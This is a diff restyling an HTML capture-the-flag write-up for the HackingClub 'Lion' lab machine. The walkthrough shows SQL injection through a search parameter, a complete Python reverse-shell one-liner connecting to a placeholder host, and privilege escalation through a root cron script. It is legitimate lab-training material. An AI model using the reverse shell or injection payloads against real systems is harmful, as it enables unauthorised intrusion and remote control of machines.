@@ -15,41 +15,31 @@
 
         <main>
             <article class="content">
-                <h1>[HackingClub] Lion Writeup</h1>
-                
-                <div class="box-info">
-                    <table>
-                        <tr>
-                            <td>Platform:</td>
-                            <td>HackingClub</td>
-                        </tr>
-                        <tr>
-                            <td>Machine:</td>
-                            <td>Lion</td>
-                        </tr>
-                        <tr>
-                            <td>Category:</td>
-                            <td>Web Exploitation</td>
-                        </tr>
-                        <tr>
-                            <td>OS:</td>
-                            <td>Linux</td>
-                        </tr>
-                        <tr>
-                            <td>Difficulty:</td>
-                            <td><span class="difficulty easy">Easy</span></td>
-                        </tr>
-                    </table>
+                <a class="back-link" href="../hackingclub.html">← hackingclub</a>
+
+                <div class="article-head">
+                    <span class="badge badge-hc">HC</span>
+                    <span class="diff diff-easy">easy</span>
+                    <span class="article-cat">· linux / web</span>
                 </div>
 
-                <div class="tags" style="margin-bottom: 30px;">
+                <h1>Lion</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackingClub</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">Lion</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
                     <span class="tag">sql-injection</span>
                     <span class="tag">cron</span>
                 </div>
 
                 <img src="../../images/hackingclub/lion/index.webp" alt="Lion Machine" style="max-width: 100%; margin-bottom: 20px;">
 
-                <h2>## Recon</h2>
+                <h2>Recon</h2>
                 
                 <p>During the recon phase using Nmap and Feroxbuster, we found a few interesting things, such as an endpoint <code>/admine/includes</code> that contains some information, but we didn't find anything suspicious. The Nmap scan didn't reveal anything unusual either.</p>
                 <img src="../../images/hackingclub/lion/nmap.webp" alt="Nmap" style="max-width: 100%; margin: 20px 0;">
@@ -58,7 +48,7 @@
                 <p>Looking at the <code>/index.php</code> directory, we notice a search field that sends a POST request to <code>search.php</code> (the parameter used is <code>searchtitle</code>, as seen in the form). By attempting an SQL injection query, we can retrieve the first flag.</p>
                 <img src="../../images/hackingclub/lion/search.webp" alt="Search" style="max-width: 100%; margin: 20px 0;">
 
-                <h2>## Exploitation</h2>
+                <h2>Exploitation</h2>
                 
                 <p>This is an SQLi vulnerability. For manual exploitation, we'll first attempt to determine the number of columns using the following query: <code>' order by 7 #</code></p>
 
@@ -89,7 +79,7 @@
                 <p>Now, we can get reverse shell with python:</p>
                 <pre><code>export RHOST="IP";export RPORT=PORTA;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'</code></pre>
 
-                <h2>## Post Exploitation</h2>
+                <h2>Post Exploitation</h2>
                 
                 <p>I ran <code>linpeas</code> to find potential vectors for privilege escalation. We found a <code>.sh</code> file (with misconfigured permissions) that is set to run as root in a cron job.</p>
                 <img src="../../images/hackingclub/lion/pos1.webp" alt="Post 1" style="max-width: 100%; margin: 20px 0;">
@@ -114,9 +104,6 @@
                 </div>
             </article>
 
-            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px dashed var(--text-dim);">
-                <a href="../../writeups.html">&lt;&lt; Back to Writeups</a>
-            </div>
         </main>
 
         <div data-component="footer" data-base-path="../../"></div>
